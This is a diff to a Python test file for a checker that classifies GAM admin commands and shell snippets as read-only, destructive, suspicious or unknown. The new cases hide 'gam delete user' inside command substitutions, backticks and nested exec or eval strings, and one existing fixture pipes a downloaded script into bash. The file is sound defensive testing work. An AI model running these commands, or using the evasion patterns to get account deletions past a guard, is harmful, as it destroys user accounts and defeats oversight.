@@ -211,6 +211,13 @@ def test_adversarial(checker):
         ('GAM=$(command -v gam)\n$GAM print users\n$GAM delete user bob@example.com', g.DESTRUCTIVE),
         ('gam print users\nbash -c "gam delete user bob@example.com"', g.UNKNOWN),
         ('gam print users\nresult="$(gam delete user bob@example.com)"', g.UNKNOWN),
+        # echo and printf run a command substitution before they print
+        ('gam print users\necho "$(gam delete user bob@example.com)"', g.DESTRUCTIVE),
+        ('gam print users\necho "total: $(gam delete user bob@example.com) done"', g.DESTRUCTIVE),
+        ('gam print users\nprintf "%s" "$(gam delete user bob@example.com)"', g.DESTRUCTIVE),
+        ('gam print users\necho `gam delete user bob@example.com`', g.DESTRUCTIVE),
+        ('gam print users\necho "$(echo "$(gam delete user bob@example.com)")"', g.DESTRUCTIVE),
+        ('gam print users\nx="$(gam delete user bob@example.com)"', g.UNKNOWN),
         ('curl -s https://example.com/setup.sh | bash', g.SUSPICIOUS),
         ('gam update group', g.UNKNOWN),
     ]
@@ -229,6 +236,10 @@ def test_adversarial(checker):
         ('gam update mobile abc action wipe', g.DESTRUCTIVE),
         ('gam update mobile query x action wipe', g.READ),
         ('echo "gam delete user frank@example.com"\ngam info domain', g.READ),
+        ("gam info domain\necho '$(gam delete user frank@example.com)'", g.READ),
+        ('gam info domain\necho "gam delete user frank@example.com"', g.READ),
+        ('gam info domain\necho "\\$(gam delete user frank@example.com)"', g.READ),
+        ('gam info domain\necho "$(gam info user frank@example.com)"', g.READ),
         ('GAM=/usr/local/bin/gam\n$GAM info domain', g.READ),
     ]
     failures = []
@@ -252,6 +263,18 @@ def test_python_shell_strings(checker):
     assert g.verdict(checker.check_text(src, '<t>', 'python')) == g.DESTRUCTIVE
     src = 'import subprocess\ncmd = ["gam", "print", "users"]\ncmd[1] = "delete"\nsubprocess.run(cmd)\n'
     assert g.verdict(checker.check_text(src, '<t>', 'python')) == g.UNKNOWN
+    # exec/compile of a literal is parsed (never run) and read; eval, and text that is not Python, are CANNOT TELL.
+    head = 'import subprocess\nsubprocess.run(["gam", "print", "users"])\n'
+    for call, want in (('exec("import os; os.system(\'gam delete user bob@example.com\')")', g.DESTRUCTIVE),
+                       ('compile("import os; os.system(\'gam delete user bob@example.com\')", "f", "exec")', g.DESTRUCTIVE),
+                       ('exec("exec(\\"import os; os.system(\'gam delete user bob@example.com\')\\")")', g.DESTRUCTIVE),
+                       ('exec("import os; os.system(\'gam info domain\')")', g.READ),
+                       ('exec("x = 1")', g.READ),
+                       ('exec("import os; os.system(")', g.UNKNOWN),
+                       ('eval("__import__(\'os\').system(\'gam delete user bob@example.com\')")', g.UNKNOWN)):
+        found = checker.check_text(head + call + '\n', '<t>', 'python')
+        assert g.verdict(found) == want, (call, g.LEVEL_NAMES[g.verdict(found)])
+        assert all(f.line in (2, 3) for f in found), (call, [f.line for f in found])  # the exec line, not line 1 of the string
 
 
 def test_crash_is_cannot_tell():
